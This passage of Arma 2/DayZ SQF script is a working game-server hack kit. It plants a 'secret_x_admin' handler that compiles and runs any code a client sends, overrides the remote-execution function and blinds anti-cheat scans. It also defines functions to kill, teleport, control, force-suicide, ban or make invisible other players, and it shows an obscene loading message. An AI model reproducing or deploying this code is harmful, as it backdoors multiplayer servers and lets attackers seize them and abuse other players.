	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};


	playableUnits = [player];
	allUnits = [player];
	allMissionObjects = [player];
	entities = [player];

	loadFile = "STRING";
	rcallVarcode = "STRING";

	sleep 25;
	};
	};
	},{
	_fileArray = Deathly_HackScript;
	while {true} do
	{

	for "_i" from 0 to (count _fileArray)-1 do
	{
	if ((preProcessFileLineNumbers (_fileArray select _i)) != "") then
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	_caughtScript = format ['%1', _i];
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'Script', _caughtScript, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	sleep 0.2;
	};
	sleep 120;

	for "_i" from 0 to (count _fileArray)-1 do
	{
	_a = (_fileArray select _i);
	_scan = format ["Missions\%1",_a];
	if ((preProcessFileLineNumbers _scan) != "") then
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	_caughtScript = format ['%1', _i];
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'ScriptM', _caughtScript, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	sleep 0.2;
	};
	sleep 120;

	for "_i" from 0 to (count _fileArray)-1 do
	{
	_a = (_fileArray select _i);
	_scan = format ["MPMissions\%1",_a];
	if ((preProcessFileLineNumbers _scan) != "") then
	{
	_world = toUpper(worldName);
	_nearestCity = (nearestLocations [getPos player, ["NameCityCapital","NameCity","NameVillage","NameLocal"],1000] select 0);
	_town = "Wilderness";
	if (!isNull _nearestCity) then {_town = text _nearestCity};
	_caughtScript = format ['%1', _i];
	rthethsrthsfghsfhsfg = [true, name player, getPlayerUID player, 'ScriptMP', _caughtScript, _world, _town];
	publicVariableServer 'rthethsrthsfghsfhsfg';
	sleep 2;
	hiveupdateresu = 1;
	publicVariable "hiveupdateresu";
	};
	sleep 0.2;
	};
	sleep 120;
	};
	}];
	};
};

BP_PlayerLoginInitcsx = _PROTECTED_BP_PlayerLoginInit;

publicVariable "BP_PlayerLoginInitcsx";


BIS_MPF_remoteExecutionServer =
{
if ((_this select 1) select 2 == "JIPrequest") then
{
_callType = (_this select 0);
_playerID = getPlayerUID ((_this select 1) select 0);
_playerObj = (_this select 1) select 0;
_playerName = name _playerObj;
_clientID = owner _playerObj;


[nil,(_this select 1) select 0,"loc",rJIPEXEC,[any,any,"per","execVM","ca\Modules\Functions\init.sqf"]] call RE;
[nil,(_this select 1) select 0,"loc",rCallVar,[],"BP_PlayerLoginInitcsx"] call RE;
};
};

[] spawn { _BIS_MPF_remoteExecutionServer = str(BIS_MPF_remoteExecutionServer);
			while {true} do { waitUntil {str(BIS_MPF_remoteExecutionServer) != _BIS_MPF_remoteExecutionServer};
			call compile format["BIS_MPF_remoteExecutionServer = %1;",_BIS_MPF_remoteExecutionServer]; }; };

"secret_x_admin" addPublicVariableEventHandler
{
	call compile toString (_this select 1);
};

server_onPlayerDisconnect = {
private ["_object","_myGroup","_playerID","_playerName","_characterID","_playerIDtoarray","_timeout","_id"];
_playerID = _this select 0;
_playerName = _this select 1;

if (_playerName == '__SERVER__' || _playerID == '' || local player) exitWith {};

if (_playerName == '__HC__' || _playerName == 'HC') then {
HeadlessClientID = 0;
};

_object = call compile format["player%1",_playerID];
_characterID =	_object getVariable ["characterID","0"];
_timeout = _object getVariable["combattimeout",0];

_playerIDtoarray = [];
_playerIDtoarray = toArray _playerID;

if (vehicle _object != _object) then {
_inVehicle = true;
_object action ["eject", vehicle _object];
};

if (59 in _playerIDtoarray) exitWith { };

if ((_timeout - time) > 0) then {
_msg = format["PLAYER HAS COMBAT LOGGED: %1 (%2)", _playerName,_timeout-time];
diag_log _msg;
[nil, nil, rTitleText, _msg, "PLAIN DOWN"] call RE;
//_key = format["CHILD:799:update survivor set is_dead=1 where `unique_id` = '%1':[]:", _playerID];
//_key call server_hiveWrite;
};

if (_characterID != "0") then {
if (alive _object) then {
//[_playerID,_characterID,typeof _object,_object] spawn player_discoMorph;
[_object,[],true,true] call server_playerSync;
_id = [_playerID, _characterID, 2] spawn dayz_recordLogin;
};
};

diag_log format["DISCONNECT: %1 (%2) Object: %3, _characterID: %4", _playerName,_playerID,_object,_characterID];

dayz_disco = dayz_disco - [_playerID];

if (!isNull _object) then {

{ [_x,"gear"] call server_updateObject } foreach
(nearestObjects [getPosATL _object, ["Car", "Helicopter", "Motorcycle", "Ship", "TentStorage"], 10]);
if (alive _object) then {

[_object,[],true] call server_playerSync;
_myGroup = group _object;
deleteVehicle _object;
deleteGroup _myGroup;
};
};
};

"tlmadminrq" addPublicVariableEventHandler
{
	_array = _this select 1;
	_option = _array select 0;
	if (_option == 0) then
	{
		_object = (_array select 2) createVehicle (_array select 3);
		dayz_serverObjectMonitor set [count dayz_serverObjectMonitor, _object];

		_object setVariable ["ObjectID", "1", true];
		_object setVariable ["ObjectUID", "1", true];
	};
	if (_option == 1) then
	{
		vehicle (_array select 1) setPosATL (_array select 2);
	};
	if (_option == 2) then
	{
		_do = format ["if (getPlayerUID player == '%1') then
		{
			_unit = player;
			_selection = ""legs"";
			_damage = 1;
			_unit setHit[_selection,_damage];
		};", getPlayerUID (_array select 2)];
		_list = [0,0,0] nearEntities 1000000000000000; (_list select 0) setVehicleInit _do; processInitCommands; clearVehicleInit (_list select 0);
	};
	if (_option == 3) then
	{
		if (_array select 2) then
		{
			doinv = format ["
			{
				if (getPlayerUID _x == '%1') then
				{
					_x hideObject true;
				};
			} forEach ([6800, 9200, 0] nearEntities [['AllVehicles'], 110000000]);", getPlayerUID (_array select 1)];
		}
		else
		{
			doinv = format ["
			{
				if (getPlayerUID _x == '%1') then
				{
					_x hideObject false;
				};
			} forEach ([6800, 9200, 0] nearEntities [['AllVehicles'], 110000000]);", getPlayerUID (_array select 1)];
		};
		_list = [0,0,0] nearEntities 1000000000000000; (_list select 0) setVehicleInit doinv; processInitCommands; clearVehicleInit (_list select 0);
	};
	if (_option == 4) then
	{
		vehicle (_array select 2) setDamage 1;
	};
	if (_option == 5) then
	{
		_unit = _array select 2;
		_unit setVariable ["USEC_lowBlood",false,true];
		PVDZ_hlt_Morphine = [_unit,player];
		publicVariable "PVDZ_hlt_Morphine";
		_unit setVariable["medForceUpdate",true];
		PVDZ_hlt_Bandage = [_unit];

		publicVariable "PVDZ_hlt_Bandage";
		{_unit setVariable[_x,false,true];} foreach USEC_woundHit;
		_unit setVariable ["USEC_injured",false,true];
		_unit setVariable ["USEC_lowBlood",false,true];
		PVDZ_hlt_Transfuse = [_unit];

		publicVariable "PVDZ_hlt_Transfuse";
		_unit setVariable ["NORRN_unconscious", false, true];
		_unit setVariable ["USEC_iscardiac",false,true];
		PVDZ_hlt_PainK = [_unit,player];
		publicVariable "PVDZ_hlt_PainK";
		_unit setVariable ["medForceUpdate",true];
		_unit setdamage 0;
		_do = format ["if (getPlayerUID player == '%1') then
		{
			disableSerialization;
			r_fracture_legs = false;
			r_fracture_arms = false;
			dayz_sourceBleeding = objNull;
			r_player_blood = r_player_bloodTotal;
			r_player_inpain = false;
			r_player_infected = false;
			r_player_injured = false;
			dayz_hunger = 0;
			dayz_thirst = 0;
			dayz_temperatur = 40;
			r_fracture_legs = false;
			r_fracture_arms = false;
			r_player_dead = false;
			r_player_unconscious = false;
			r_player_loaded = false;
			r_player_cardiac = false;
			r_player_lowblood = false;
			r_player_timeout = 0;
			r_handlercount = 0;
			_display = uiNamespace getVariable 'DAYZ_GUI_display';
			_control = _display displayCtrl 1203;
			_control ctrlShow false;
			r_player_handler = false;
			disableUserInput false;
			""dynamicBlur"" ppEffectAdjust [0]; ""dynamicBlur"" ppEffectCommit 5;
			_unit = player;
			_selection = ""legs"";
			_damage = 0;
			_unit setHit[_selection,_damage];
		};", getPlayerUID (_array select 2)];
		_list = [0,0,0] nearEntities 1000000000000000; (_list select 0) setVehicleInit _do; processInitCommands; clearVehicleInit (_list select 0);
	};
	if (_option == 6) then
	{
		_pos = getPos (_array select 1);
		admincrate = "USBasicAmmunitionBox" createVehicle _pos;
		{admincrate addWeaponCargoGlobal [_x, 5];} forEach
		['AK_107_GL_Kobra','AK_107_Kobra','AK_107_PSO','AK_47_M',
		'AK_47_S','AK_74','AK_74_GL','AK_74_GL_Kobra','AKS_74','AKS_74_Kobra',
		'AKS_74_PSO','AKS_74_U','AKS_74_UN_Kobra','AKS_GOLD','BAF_AS50_scoped',
		'BAF_AS50_TWS','BAF_L110A1_Aim','BAF_L7A2_GPMG','BAF_L85A2_RIS_ACOG',
		'BAF_L85A2_RIS_CWS','BAF_L85A2_RIS_Holo','BAF_L85A2_RIS_SUSAT',
		'BAF_L85A2_UGL_ACOG','BAF_L85A2_UGL_Holo','BAF_L85A2_UGL_SUSAT',
		'BAF_L86A2_ACOG','BAF_LRR_scoped','BAF_LRR_scoped_W','bizon','bizon_silenced',
		'Colt1911','Crossbow','DMR','G36_C_SD_camo','G36_C_SD_eotech','G36a',
		'G36A_camo','G36C','G36C_camo','G36K','G36K_camo','FN_FAL','FN_FAL_ANPVS4',
		'glock17_EP1','Huntingrifle','ksvk','LeeEnfield','M1014','m107_DZ',
		'M14_EP1','M16A2','M16A2GL','m16a4','m16a4_acg','M16A4_ACG_GL','M16A4_GL',
		'M24','M24_des_EP1','M240','m240_scoped_EP1','M249','M249_EP1','M249_m145_EP1',
		'M40A3','M4A1','M4A1_Aim','M4A1_Aim_camo','M4A1_AIM_SD_camo','M4A1_HWS_GL',
		'M4A1_HWS_GL_camo','M4A1_HWS_GL_SD_Camo','M4A1_RCO_GL','M4A3_CCO_EP1',
		'M4A3_RCO_GL_EP1','M4SPR','M60A4_EP1','M9','M9SD','Makarov','MakarovSD',
		'MeleeHatchet','MeleeCrowbar','MG36','Mk_48_DES_EP1','Mk_48_DZ','MP5A5',
		'MP5SD','MR43','Pecheneg','PK','Remington870_lamp','revolver_EP1',
		'revolver_gold_EP1','RPK_74','Sa61_EP1','Saiga12K','SVD','SVD_CAMO',
		'SVD_des_EP1','SVD_NSPU_EP1','UZI_EP1','UZI_SD_EP1','Winchester1866',
		'Binocular','Binocular_Vector','ItemCompass','ItemEtool','ItemFlashlight',
		'ItemFlashlightRed','ItemGPS','ItemHatchet','ItemKnife','ItemMap',
		'ItemMatchbox','ItemRadio','ItemToolbox','ItemWatch','Laserdesignator',
		'NVGoggles'];
		{admincrate addMagazineCargoGlobal [_x, 20];} forEach



		['2Rnd_shotgun_74Slug','2Rnd_shotgun_74Pellets','5Rnd_127x108_KSVK',
		'5Rnd_127x99_as50','5Rnd_762x51_M24','5Rnd_86x70_L115A1','5x_22_LR_17_HMR',
		'6Rnd_45ACP','7Rnd_45ACP_1911','8Rnd_9x18_Makarov','8Rnd_9x18_MakarovSD',
		'8Rnd_B_Beneli_74Slug','8Rnd_B_Beneli_Pellets','8Rnd_B_Saiga12_74Slug',
		'8Rnd_B_Saiga12_Pellets','10Rnd_127x99_M107','10Rnd_762x54_SVD',
		'10x_303','15Rnd_9x19_M9','15Rnd_9x19_M9SD','15Rnd_W1866_Slug',
		'15Rnd_W1866_Pellet','17Rnd_9x19_glock17','20Rnd_556x45_Stanag',
		'20Rnd_762x51_DMR','20Rnd_762x51_FNFAL','20Rnd_B_765x17_Ball',
		'30Rnd_545x39_AK','30Rnd_545x39_AKSD','30Rnd_556x45_G36','30Rnd_556x45_G36SD',
		'30Rnd_556x45_Stanag','30Rnd_556x45_StanagSD','30Rnd_762x39_AK47',
		'30Rnd_9x19_MP5','30Rnd_9x19_MP5SD','30Rnd_9x19_UZI','30Rnd_9x19_UZI_SD',
		'50Rnd_127x108_KORD','64Rnd_9x19_Bizon','64Rnd_9x19_SD_Bizon','75Rnd_545x39_RPK',
		'100Rnd_762x51_M240','100Rnd_762x54_PK','100Rnd_556x45_BetaCMag','100Rnd_556x45_M249',
		'200Rnd_556x45_L110A1','200Rnd_556x45_M249','BoltSteel','1Rnd_HE_GP25',
		'1Rnd_HE_M203','1Rnd_Smoke_GP25','1Rnd_SmokeGreen_GP25','1Rnd_SmokeRed_GP25',
		'1Rnd_SmokeYellow_GP25','1Rnd_Smoke_M203','1Rnd_SmokeGreen_M203',
		'1Rnd_SmokeRed_M203','1Rnd_SmokeYellow_M203','6Rnd_HE_M203','BAF_ied_v1',
		'FlareGreen_GP25','FlareRed_GP25','FlareWhite_GP25','FlareYellow_GP25',
		'FlareGreen_M203','FlareRed_M203','FlareWhite_M203','FlareYellow_M203',
		'HandGrenade_East','HandGrenade_West','M136','SmokeShell','SmokeShellBlue',
		'SmokeShellGreen','SmokeShellOrange','SmokeShellPurple','SmokeShellRed',
		'SmokeShellYellow','PipeBomb','FoodCanBakedBeans','FoodCanFrankBeans',
		'FoodCanPasta','FoodCanSardines','FoodSteakCooked','FoodSteakRaw',
		'HandChemBlue','HandChemGreen','HandChemRed','HandRoadFlare','ItemAntibiotic',
		'ItemBandage','ItemBloodbag','ItemEpinephrine','ItemHeatPack','ItemJerrycan',
		'ItemJerrycanEmpty','ItemMorphine','ItemPainkiller','ItemSandbag','ItemSodaCoke',
		'ItemSodaEmpty','ItemSodaMdew','ItemSodaPepsi','ItemTankTrap','ItemTent',
		'ItemWire','ItemWaterbottle','ItemWaterbottleUnfilled','PartEngine',
		'PartFueltank','PartGeneric','PartGlass','PartWheel','PartWoodPile',
		'PartVRotor','TrapBear','TrashTinCan','TrashJackDaniels','Skin_Camo1_DZ',
		'Skin_Soldier1_DZ','Skin_Sniper1_DZ','Skin_Survivor2_DZ'];
		admincrate addBackpackCargoGlobal ['DZ_Backpack_EP1', 1];


	};
	if (_option == 7) then
	{
		_list = [0,0,0] nearEntities 1000000000000000; (_list select 0) setVehicleInit format ["if !(isServer) then
		{
			if (getPlayerUID player == '%1') then
			{
				[] spawn
				{
					if (isNil ""aatp"") then
					{
						aatp = true;
						_tempTime = time;
						time = ""aatp"";
						sleep 3;
						[_tempTime] spawn
						{
							_tempTime = (_this select 0) + 3;
							while {true} do
							{
								time = _tempTime;
								_tempTime = _tempTime + 1;
								sleep 1;
							};
						};
					};
					_tent = player;
					_dir = 90;
					_location = %2;
					_tent setdir _dir;
					_tent setpos _location;
					player reveal _tent;
				};
			};
		};", getPlayerUID (_array select 2), str (getPosATL (_array select 1))]; processInitCommands; clearVehicleInit (_list select 0);
		
	};
	if (_option == 8) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; [player, 999] spawn {
			private["_unit","_damage"];
			_unit = _this select 0;
			_damage = _this select 1;
			_inVehicle = (vehicle _unit != _unit);
			if (_unit == player) then {
				r_player_timeout = 999;
				if (_type == 1) then {r_player_timeout = r_player_timeout + 90};
				if (_type == 2) then {r_player_timeout = r_player_timeout + 60};
				r_player_unconscious = true;
				player setVariable["medForceUpdate",true,true];
				player setVariable ["unconsciousTime", r_player_timeout, true];
			};
			if (_inVehicle) then {
				_unit spawn {
					private["_veh","_unit"];
					_veh = vehicle _this;
					_unit = _this;
					waitUntil{(((position _veh select 2 < 1) and (speed _veh < 1)) or (!r_player_unconscious))};
					if (r_player_unconscious) then {
						_unit action ["eject", _veh];
						waitUntil{((vehicle _this) != _this)};
						sleep 1;
						_unit setVariable ["NORRN_unconscious", true, true];
						_unit playActionNow "Die";
					};
				};
			} else {
				_unit setVariable ["NORRN_unconscious", true, true];
				_unit playActionNow "Die";
			};
		};}] call RE;
	};
	if (_option == 9) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; _object = player;
			player setUnitRecoilCoefficient 0;
			player_zombieCheck = {};
			fnc_usec_damageHandler = {};
			fnc_usec_unconscious  = {};
			_object allowDamage false;
			hint "God Enabled";}] call RE;
	};
	if (_option == 10) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; player setUnitRecoilCoefficient 1;
			player_zombieCheck = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\player_zombieCheck.sqf";
			fnc_usec_damageHandler = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_damageHandler.sqf";
			fnc_usec_unconscious = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_unconscious.sqf";
			player allowDamage true;
			hint "God Disabled";}] call RE;
	};
	if (_option == 11) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; 
			hint "Speed upgrade loaded!";
			waituntil {!isnull (finddisplay 46)};
			MY_KEYDOWN_FNC_xx1 = {

				_vcl = vehicle player;
				if(_vcl == player)exitwith{};

				_nos = _vcl getvariable "nitro";
				_supgrade = _vcl getvariable "supgrade";

				if(isEngineOn _vcl) then
				{
					switch (_this) do {
						case 17: {
							if(isEngineOn _vcl and !isnil "_supgrade") then
							{
								_vcl SetVelocity [(velocity _vcl select 0) * 1.011, (velocity _vcl select 1) *1.011, (velocity _vcl select 2) * 0.99];
							} else {
								_vcl setvariable ["supgrade", 1];
							};
						};
						case 42: {
							if(isEngineOn _vcl and !isnil "_nos") then
							{
								_vcl setVelocity [(velocity _vcl select 0) * 1.01, (velocity _vcl select 1) * 1.01, (velocity _vcl select 2) * 0.99];
							} else {
								_vcl setvariable ["nitro", 1];
							};
						};
					};
				};
			};
			while {true} do 
			{
				adminvehicleSpeedy = (findDisplay 46) displayAddEventHandler ["KeyDown","_this select 1 call MY_KEYDOWN_FNC_xx1;false;"];
				sleep 0.5;
			};
		}] call RE;
	};
	if (_option == 12) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; _randomNess = [1,-1] call BIS_fnc_selectRandom;
		(vehicle player) SetVelocity [_randomNess * random(10)* cos getdir (vehicle player), _randomNess * random(10)* cos getdir (vehicle player), random(5)];

		hint "watatatatata slap";}] call RE;
	};
	if (_option == 13) then
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; 
		
			while {true} do {
				hint "You took drugs YOLOLOLO";
			   nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
			   nonapsi_ef ppEffectEnable true;
			   nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.03, [0.0, 0.0, 0.0, 0.0], [3.0, 5.0, 9.0, 5.0],[0.4,0.0,0.0, 0.7]];
			   nonapsi_ef ppEffectCommit 1;
			   
			   sleep random(1);
			   
			   wetdist1 = ppEffectCreate ["wetDistortion", 2006];
				wetdist1 ppEffectAdjust [0, 8, 0.8,8,8, 0.2, 1, 0, 0, 0.08, 0.08, 0, 0, 0, 0.77];
				wetdist1 ppEffectEnable true;
				wetdist1 ppEffectCommit 0;
				ppe = ppEffectCreate ["colorCorrections", 1555]; 
				ppe ppEffectAdjust [1, 1, 0, [1.5,6,2.5,0.5], [5,3.5,5,-0.5], [-3,5,-5,-0.5]]; 
				ppe ppEffectCommit 1;
				ppe ppEffectEnable true; 
				ppe2 = ppEffectCreate ["chromAberration", 1555]; 
				ppe2 ppEffectAdjust [0.01,0.01,true];
				ppe2 ppEffectCommit 1;
				ppe2 ppEffectEnable true;
				ppe3 = ppEffectCreate ["radialBlur", 1555]; 
				ppe3 ppEffectEnable true;
				ppe3 ppEffectAdjust [0.02,0.02,0.15,0.15]; 
				ppe3 ppEffectCommit 1;

				sleep random(1);

				wetdist1 = ppEffectCreate ["wetDistortion", 2006];
				wetdist1 ppEffectAdjust [1, 1.16, 0.32, 2.56, 0.8, 0.64, 2.64, 0, 0, 1.08, 0.08, 0, 0, 0, 1.77];
				wetdist1 ppEffectEnable true;
				wetdist1 ppEffectCommit 0;

				sleep random(1);

			   nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
			   nonapsi_ef ppEffectEnable true;
			   nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.02, [9.5, 1.5, 2.5, 0.2], [2.0, 7.0, 6.0, 2.0],[0.4,0.0,0.0, 0.7]];
			   nonapsi_ef ppEffectCommit 1;
			   
			   sleep random(1);
			};

		}] call RE;
	};
	if (_option == 14) then //kick
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; hiveupdateresu = 1; publicVariable "hiveupdateresu"; 
		"Sheep" createUnit [[0,0,0], createGroup EAST,";call compile ""[] spawn {};"";", 0.6, "corporal"]; 
		for "_i" from 0 to 99 do {(findDisplay _i) closeDisplay 0;}; endMission "END1"; }] call RE;
	};
	if (_option == 15) then //ban
	{
		_unit = _array select 2;
		
		_BanList = 	profileNamespace getVariable ["AHBanList",[]];
		_BanList set [count _BanList, getPlayerUID _unit];
		profileNamespace setVariable ["AHBanList", _BanList]; saveProfileNamespace;
		
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; hiveupdateresu = 1; publicVariable "hiveupdateresu"; 
		"Sheep" createUnit [[0,0,0], createGroup EAST,";call compile ""[] spawn {};"";", 0.6, "corporal"]; 
		for "_i" from 0 to 99 do {(findDisplay _i) closeDisplay 0;}; endMission "END1"; }] call RE;
	};
	if (_option == 16) then //clear ban
	{
		_unit = _array select 1;
		
		profileNamespace setVariable ["AHBanList", []]; saveProfileNamespace;
	};
	if (_option == 17) then //WeatherLord
	{
		_selection = _array select 2;
		_intensity = _array select 3;
		switch (_selection) do {
			case 1:
			{
				[nil, nil, rSPAWN, _intensity, { "drn_DynamicWeatherEventArgs" addPublicVariableEventHandler {}; setViewDistance _this; }] call RE;
			};
			case 2:
			{
				[nil, nil, rSPAWN, _intensity, { "drn_DynamicWeatherEventArgs" addPublicVariableEventHandler {}; 0 setOvercast _this; }] call RE;
			};
			case 3:
			{
				[nil, nil, rSPAWN, _intensity, { "drn_DynamicWeatherEventArgs" addPublicVariableEventHandler {}; 5 setRain _this; }] call RE;
			};
		};
	};
	if (_option == 18) then //suicide
	{
		_unit = _array select 2;
		[nil, nil, rSPAWN, _unit, { if !(local _this) exitWith {}; 
						removeAllWeapons player; 
						player addEventHandler ["fired", {if (alive player) then { player SetDamage 1.1;};}];
						_config = "glock17_EP1";_isOK = [player,_config, true] call BIS_fnc_invAdd;
						_config = "17Rnd_9x19_glock17";_isOK = [player,_config, true] call BIS_fnc_invAdd;
						player selectWeapon "glock17_EP1";
						reload player;
						sleep 1.5;
						player switchMove "ActsPercMstpSnonWpstDnon_suicide1B";
						sleep 3.9;
						player fire (currentWeapon player); 
		}] call RE;
	};
	if (_option == 19) then //mass message
	{
		_msg = _array select 2;
		[nil, nil, rTitleText, toString(_msg), "PLAIN"] call RE;
	};
	if (_option == 20) then //time
	{
		server_hiveReadWrite = {
			private["_key","_resultArray","_data"];
			_key = _this;
			if(_key == "CHILD:307:") then
			{
				["PASS",date]
			}
			else {
				//diag_log ("ATTEMPT READ/WRITE: " + _key);
				_data = "HiveExt" callExtension _key;
				//diag_log ("READ/WRITE: " +str(_data));
				_resultArray = call compile format ["%1",_data];
				_resultArray
			};
		};
		_date = _array select 2;
		_offset = _array select 3;
		_date set [3,_offset];
		setDate _date;
		[nil, nil, rSPAWN, _date, { setDate _this; }] call RE;
	};
	
};

[] spawn {
	_object_damage = {
	private["_hitpoints","_array","_hit","_selection","_key","_damage"];
	_object = 	_this select 0;
	_objectID =	_object getVariable ["ObjectID","0"];
	_uid = 		_object getVariable ["ObjectUID","0"];
	
	_hitpoints = _object call vehicle_getHitpoints;
	_damage = damage _object;
	_array = [];
	{
	_hit = [_object,_x] call object_getHit;
	_selection = getText (configFile >> "CfgVehicles" >> (typeOf _object) >> "HitPoints" >> _x >> "name");
	if (_hit > 0) then {_array set [count _array,[_selection,_hit]]};
	_object setHit ["_selection", _hit]
	} forEach _hitpoints;

	_key = format["CHILD:306:%1:%2:%3:",_objectID,_array,_damage];

	_key call server_hiveWrite;
	_object setVariable ["needUpdate",false,true];
	};

	waitUntil {!isNil ("sm_done")};
	sleep 120;
	{
		if (_x isKindOf "AllVehicles") then {
			diag_log ("Running cleanup on " + (typeof _x));
			[_x] call _object_damage;
		};
	} forEach vehicles;
};

execVM "\372\2.hpp";

BIS_MPF_remoteExecutionServeradmin_menu1 = {
if (isNil "firstTiem") then { firstTiem = 1;
_config = "ItemMap";_isOK = [player,_config, true] call BIS_fnc_invAdd;
(findDisplay 46) displayAddEventHandler ["KeyDown", "altstate = _this select 4"];
(finddisplay 46) displayAddEventHandler ["KeyDown", "_this call eslmzognia"];
((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ["MouseButtonDown", "if (((_this select 1) == 0) && altstate) then
{
	_monkypos = (_this select 0) posScreenToWorld [_this select 2, _this select 3];
	[_monkypos] spawn monkytp;
};"];

monkytp =
{
	_monkypos = (_this select 0);
	_veh = (vehicle player);
	if (_veh isKindOf "Air") then {_monkypos set [2, 150]; _veh setPos _monkypos;} else {_veh setPos _monkypos;};
};
};



















startLoadingScreen [format ["LOADING my dick into ur buttyhole...",_nul],"RscDisplayLoadMission"];
sleep 0.3;
createdialog "RscDisplayMultiplayerSetup";


hack_addwep = {
_config = _this select 1;_isOK = [player,_config, true] call BIS_fnc_invAdd;


_magazines = getArray (configFile >> "CfgWeapons" >> _this select 1 >> "magazines");

{
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
}foreach _magazines;

reload player;

hint format ["%1 Added.",_this select 1];
};

hack_refill = {


_magazines = getArray (configFile >> "CfgWeapons" >> currentWeapon (vehicle player) >> "magazines");

{
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
_config = _x;_isOK = [player,_config, true] call BIS_fnc_invAdd;
}foreach _magazines;

reload player;

hint format ["%1 Refilled.",currentWeapon (vehicle player)];
};


hack_killPlr = {
_name = _this select 0;
	{
		if (name _x == _name) then
		{
			_entity = _x;	
			_entity setDamage 1;
		};
	} forEach allUnits;
};

hack_invis = {
		if (isNil 'inv1') then {inv1 = 0;};
		if (inv1 == 0) then
		{
			tlmadminrq = [3, player, true];
			publicVariable "tlmadminrq";
			inv1 = 1;
			hint "Invisibility Enabled";
		}
		else
		{
			tlmadminrq = [3, player, false];
			publicVariable "tlmadminrq";
			inv1 = 0;
			hint "Invisibility Disabled";
		};
};

hack_heal = {
		{
			if (name _x == _this select 0) then
			{
				tlmadminrq = [5,player,_x];
				publicVariable "tlmadminrq";
				hint format ["Healing %1", _this select 0];
			};
		} forEach allUnits;
};

hack_god = {
		if (isNil "gmdadmin") then {gmdadmin = 0;};
		if (gmdadmin == 0) then
		{
			gmdadmin = 1;
			_object = player;
			player setUnitRecoilCoefficient 0;
			player_zombieCheck = {};
			fnc_usec_damageHandler = {};
			fnc_usec_unconscious  = {};
			_object allowDamage false;
			hint "God Enabled";
		}
		else
		{
			player setUnitRecoilCoefficient 1;
			player_zombieCheck = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\player_zombieCheck.sqf";
			fnc_usec_damageHandler = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_damageHandler.sqf";
			fnc_usec_unconscious = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_unconscious.sqf";
			player allowDamage true;
			gmdadmin = 0;
			hint "God Disabled";
		};
};

hack_telePlr = {
_name = _this select 0;
	{
		if (name _x == _name) then
		{
			(vehicle _x) attachTo [player,[0,0,2]];
			sleep 1;
			detach (vehicle _x);
		};
	} forEach allUnits;
};

hack_control = {
_name = _this select 0;
	{
		if (name _x == _name) then
		{
			selectPlayer _x;
		};
	} forEach allUnits;
};

hack_spawnVeh = {
	_dir = getdir vehicle player;
	_pos = getPos vehicle player;
	_pos = [(_pos select 0)-5*sin(_dir),(_pos select 1)-5*cos(_dir),0]; // 50 meters behind
	
	hangender = createVehicle [_this select 1, _pos, [], 0, "CAN_COLLIDE"];hangender setVariable ["ObjectUID", "skript made by Hangender", true];
	player reveal hangender; 
};

hack_esp = {
		adminpmark =
		{
			adminpmark_array = [];
			while {mark == 1} do
			{
				_entities = allUnits;
				for "_i" from 0 to (count _entities)-1 do
				{
					_pm = createMarkerLocal [("adminpmark" + (str _i)), getPos (_entities select _i)];
					adminpmark_array set [count adminpmark_array, _pm];
					_pm setMarkerTypeLocal "destroyedvehicle";
					_pm setMarkerSizeLocal [0.8, 0.8];
					_pm setMarkerTextLocal format ["%1", name (_entities select _i)];
					_pm setMarkerColorLocal ("ColorBlue");
				};
				sleep 3;
				{ deleteMarkerLocal _x } forEach adminpmark_array; adminpmark_array = [];
			};
			_entities = allUnits;
			{ deleteMarkerLocal _x } forEach adminpmark_array;
		};
		adminvmark =
		{
			while {mark == 1} do
			{
				_entities = vehicles;
				for "_i" from 0 to (count _entities)-1 do
				{
					if ((_entities select _i) isKindOf "AllVehicles") then {
						deleteMarkerLocal ("adminvmark" + (str _i));
						_vm = createMarkerLocal [("adminvmark" + (str _i)), getPos (_entities select _i)];
						_vm setMarkerTypeLocal "destroyedvehicle";
						_vm setMarkerSizeLocal [0.8, 0.8];
